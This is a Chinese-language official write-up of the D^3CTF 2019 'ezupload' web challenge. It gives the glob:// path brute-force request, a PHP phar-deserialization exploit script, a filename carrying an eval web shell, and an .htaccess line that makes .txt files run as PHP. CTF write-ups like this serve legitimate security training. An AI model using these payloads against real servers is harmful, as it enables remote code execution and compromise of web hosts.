# D^3ctf 2019 Official Writeup ezupload
> 出题人：Lou00@Vidar
> 考察点：glob://爆破 文件上传写shell
> 题目描述: webroot in /var/www/html
> hint1: webroot changes every 10 mins
> hint2: glob
> hint3: https://www.php.net/manual/en/language.oop5.decon.php   Pay attention to the notes in the article 

## 前言
赛后看到了Nu1l的非预期,直接把第一考点绕过了
导致给的一些hint没啥用 (hint真是害人不浅_(:з」∠)_
## 预期解
通过审计代码可以发现存在反序列化漏洞,可以任意文件写入
但是如果是用相对路径的话,发现无法写入
通过hint3知道
![-w828](http://image.lou00.top/img/ezupload/15747757481797.jpg)
在析构函数中工作目录可能会变
以下代码可以测试
![-w344](http://image.lou00.top/img/ezupload/15747755154564.jpg)
意思是要找到绝对路径
所以第一部分的payload是
```
action=count&url=1&filename=1&dir=glob:///var/www/html/*/upload/{your_upload_path}/*
```
通过爆破得到路径(然而非了
得到路径后就可以通过文件名写shell了
构造类似与下面的文件名
```
action=upload&url=http://xxx&filename=<?php echo 1.1;eval($_GET["a"]);
```
构造反序列化

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($usedir,$url,$filename){
	$this->userdir = $usedir;
	$this->url = $url;
	$this->filename = $filename;
    }
}
$a = new dir('upload/{your_upload_path}','','');
$b = new dir($a,'','/var/www/html/xxx/upload/{your_upload_path}/2');
$phar = new Phar("phar.phar"); 
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER();?>;"); 
$phar->setMetadata($b); 
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();
echo urlencode(serialize($b));
```
上传后通过`file_get_contents`触发

```
action=upload&url=phar://upload/{your_upload_path}/1.jpg&filename=2.jpg
```
然后就会发现一个带有`<?`的txt文件
最后上传一个`.htaccess`文件
内容为

```
AddHandler php7-script .txt
```
即可解析php
最后是bypass `open_basedir`
最后附上一份比赛时用于检测flag的脚本
供师傅们参考